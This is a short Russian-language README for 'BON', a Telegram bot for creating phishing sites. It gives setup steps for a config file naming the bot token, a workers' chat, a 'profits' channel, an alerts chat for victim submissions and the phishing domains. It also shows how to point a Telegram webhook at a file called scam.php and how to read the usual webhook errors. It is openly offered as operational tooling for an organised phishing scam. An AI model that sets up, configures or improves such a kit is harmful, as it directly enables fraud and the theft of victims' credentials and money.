# BON
Бот для создания фишинг сайтов.

____
1) Настроить файл `_config.php`
  1) **botToken** - токен бота от @BotFather
  2)**botLogin** - логин бота без @
  3)**prjName** - имя проекта 
  5)**linkChat** - ссылка на чат воркеров
  6)**linkPays** - ссылка на канал с профитами
  7)**chatGroup** - ID чата воркеров
  8)**chatAdmin** - ID чата админов
  9)**chatAlerts** - ID чата куда будут приходить заявки
  10)**chatProfits** - ID канала профитов
  11)**allDomains** - домены дял фишинга 
 
2) Кинуть webhook на файлик `scam.php`
 ``` https://api.telegram.org/botTOKEN/setWebhook?url=DOMAIN/scam.php ```
  1)**TOKEN** - токен бота
  2)**DOMAIN** - домен бота
 На домене бота обязательно дожен быть SSL сертификат
 
 **Ошибки при установке webhook**
 1) `{"ok":false,"error_code":401,"description":"Unauthorized"}` - **Неверный токен бота**
 2) `{"ok":false,"error_code":400,"description":"Bad Request: invalid webhook URL specified"}` - **Неверный URL бота**
 3) `{"ok":false,"error_code":400,"description":"Bad Request: bad webhook: Failed to resolve host: No address associated with hostname"}` - ****
 
 
 
 
